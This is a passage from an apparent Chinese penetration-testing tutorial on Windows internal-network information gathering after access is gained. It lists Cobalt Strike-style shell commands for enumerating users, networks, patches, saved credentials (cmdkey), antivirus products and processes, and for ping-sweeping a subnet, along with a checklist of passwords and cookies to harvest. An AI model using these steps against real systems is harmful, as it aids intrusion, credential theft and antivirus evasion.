&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">操作系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">当权用户权限
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">内网IP段（网卡信息）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">杀毒软件（AV）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">端口开放情况
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统补丁
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络状态
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">共享文件夹
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">远程信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">服务信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">软件列表
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">计划任务
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">启动项
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">系统日志
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">防火墙规则
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络代理信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">内网OA办公系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">邮件服务器
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">网络监控系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">财务应用系统
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">核心产品源码（SVN/Git 服务器）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">管理员密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">浏览器密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cookie
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">无线密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">数据库密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VPN历史密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Teamview 历史密码
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">其他用户 session
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389 连接记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IPC$ 连接记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">各用户回收站信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">用户列表
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">host 文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DNS 缓存信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">补丁信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">端口信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">账户密码策略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">账号锁定策略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Web 服务器配置文件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Web 服务器日志
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x02-windows信息收集">0x02 Windows信息收集&lt;/h1>
&lt;h3 id="1-主机信息收集">1. 主机信息收集&lt;/h3>
&lt;p>查看当前用户以及当前用户所在组，所拥有的权限。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell whoami /all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715000825.png" alt="image.png">&lt;/p>
&lt;h3 id="2-网卡和ip信息收集">2. 网卡和IP信息收集&lt;/h3>
&lt;p>查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell ipconfig /all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715001546.png" alt="image.png">&lt;br>
可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：&lt;/p>
&lt;h3 id="3-查看系统详情信息">3. 查看系统详情信息&lt;/h3>
&lt;p>可以查看网卡，系统，补丁信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell systeminfo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002249.png" alt="image.png">&lt;br>
我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://bypass.tidesec.com/exp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接复制粘贴过来即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002637.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002708.png" alt="image.png">&lt;/p>
&lt;h3 id="4-查看操作系统和版本信息">4. 查看操作系统和版本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">英文版系统用这个命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell systeminfo | findstr /B /C:&amp;#34;OS Name&amp;#34; /C:&amp;#34;OS Version&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">中文版系统用这个命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell systeminfo | findstr /B /C:&amp;#34;OS 名称&amp;#34; /C:&amp;#34;OS 版本&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003206.png" alt="image.png">&lt;/p>
&lt;h3 id="5-查看系统体系结构">5. 查看系统体系结构&lt;/h3>
&lt;p>检查系统架构（AMD64或者x86）-&amp;gt;影响后续工具选择&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell echo %PROCESSOR_ARCHITECTURE%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003409.png" alt="image.png">&lt;/p>
&lt;h3 id="6-主机路由信息">6. 主机路由信息&lt;/h3>
&lt;p>可以查看网络目标，都是主机可以直接访问到的机器&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell route print
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003943.png" alt="image.png">&lt;/p>
&lt;h3 id="7-arp缓存信息">7. ARP缓存信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell arp -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004046.png" alt="image.png">&lt;/p>
&lt;h3 id="8-dns缓存信息">8. DNS缓存信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell ipconfig /displaydns
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004213.png" alt="image.png">&lt;/p>
&lt;h3 id="9-host文件信息">9. Host文件信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell type C:\windows\System32\drivers\etc\hosts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004319.png" alt="image.png">&lt;/p>
&lt;h3 id="10-端口连接信息">10. 端口连接信息&lt;/h3>
&lt;p>可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netstat -ano
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004540.png" alt="image.png">&lt;/p>
&lt;h3 id="11-会话连接">11. 会话连接&lt;/h3>
&lt;p>可以查看主机与客户机之间的会话连接&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net session
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004712.png" alt="image.png">&lt;/p>
&lt;h3 id="12-查看当前保存的登录凭证也能看到通的ip">12. 查看当前保存的登录凭证，也能看到通的ip&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell cmdkey /l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004813.png" alt="image.png">&lt;/p>
&lt;h3 id="13-查看当前主机开启的共享列表">13. 查看当前主机开启的共享列表&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004915.png" alt="image.png">&lt;/p>
&lt;h3 id="14-远程相关信息">14. 远程相关信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">相关链接：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://bypass.tidesec.com/bycms
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">命令：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell tasklist
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005059.png" alt="image.png">&lt;/p>
&lt;h3 id="15-查看当前主机与网络中的其他主机建立的共享链接">15. 查看当前主机与网络中的其他主机建立的共享链接&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net use
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005226.png" alt="image.png">&lt;/p>
&lt;h3 id="16-查看主机进程信息">16. 查看主机进程信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic process get Name,ProcessId,ExecutablePath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以查看主机进程信息，并作出过滤进程路径，名称和pid。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005346.png" alt="image.png">&lt;/p>
&lt;h3 id="17-指定查看路径信息">17. 指定查看路径信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic process where Name=&amp;#34;有道云笔记.exe&amp;#34; get ExecutablePath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005611.png" alt="image.png">&lt;/p>
&lt;h3 id="18-查看补丁信息">18. 查看补丁信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005731.png" alt="image.png">&lt;/p>
&lt;h3 id="19-查看安装应用信息">19. 查看安装应用信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic product get Caption,Version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005846.png" alt="image.png">&lt;br>
PS：在win10中，输入&lt;code>wmic /?&lt;/code>会提示wmic已弃用，但在server2012R2,win7等版本可以正常使用&lt;br>
powershell中可代替该命令的是：&lt;code>Get-WinObject&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Get-WinObject -class win32_product | Select-object -property name,version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="20-查询本机服务">20. 查询本机服务&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic server list brief
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715010339.png" alt="image.png">&lt;/p>
&lt;h3 id="21-查询目标主机上的杀毒软件">21. 查询目标主机上的杀毒软件&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">查询进程：shell tasklist，
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">或者：shell wmic process list brief
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715110942.png" alt="image.png">&lt;br>
常见的杀软进程：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>进程名&lt;/th>
&lt;th>软件&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>360sd.exe&lt;/td>
&lt;td>360杀毒&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>360tray.exe&lt;/td>
&lt;td>360实时保护&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ZhuDongFangYu.exe&lt;/td>
&lt;td>360主动防御&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>KSafeTray.exe&lt;/td>
&lt;td>金山卫士&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SafeDogUpdateCenter.exe&lt;/td>
&lt;td>安全狗&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>McAfee McShield.exe&lt;/td>
&lt;td>McAfee&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>egui.exe&lt;/td>
&lt;td>NOD32&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>AVP.exe&lt;/td>
&lt;td>卡巴斯基&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>avhuard.exe&lt;/td>
&lt;td>小红伞&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>bdagent.exe&lt;/td>
&lt;td>BitDefender&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112024.png" alt="image.png">&lt;br>
主动防御软件的安装路径&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic /namespace:\\root\SecurityCenter2 path antiVirusProduct Get displayName,productstate,pathtosignedproductexe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="22-查看已启动的程序信息">22. 查看已启动的程序信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell wmic startup get command,caption
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112539.png" alt="image.png">&lt;/p>
&lt;h3 id="23-查看计划任务">23. 查看计划任务&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell schtasks /query /fo LISR /v
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="24-查看主机的开机时间">24. 查看主机的开机时间&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net statistics workstation
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715112823.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-探测网段存活">0x04 探测网段存活&lt;/h1>
&lt;p>高速内网扫描&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell for /l %i in (1,1,255) do @ping -n 1 -w 30 192.168.12.%i | find /i &amp;#34;ttl= &amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>随机延迟+长超时&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
